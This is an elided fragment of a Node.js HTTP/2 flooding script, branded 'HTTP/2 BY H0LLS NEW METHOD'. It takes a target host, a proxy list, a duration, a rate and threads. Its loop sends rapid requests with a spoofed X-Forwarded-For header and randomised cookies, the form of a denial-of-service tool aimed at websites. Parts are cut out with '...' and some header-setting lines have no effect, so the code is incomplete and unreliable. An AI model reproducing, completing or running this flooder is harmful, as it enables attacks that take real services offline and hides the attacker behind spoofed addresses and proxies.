...
if (process.argv.length < 8){
    console.log('HTTP/2 BY H0LLS NEW METHOD!');
	console.log('node ' + file + ' {$mode} {$host} proxy.txt {$time} {$ratelimit} threads {$cookie} {$postdata})');
                        ...
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                ...
                                for (let i = 0; i< rate; i++){
                                    ...
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
									headerbuilders["accept"].replace("text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
									headerbuilders["accept-encoding"].replace("gzip, deflate, br");
									headerbuilders["accept-language"].replace("ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7");
									headerbuilders["cache-control"].replace("max-age=0");
									headerbuilders[":scheme"].replace("HTTPS");				
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
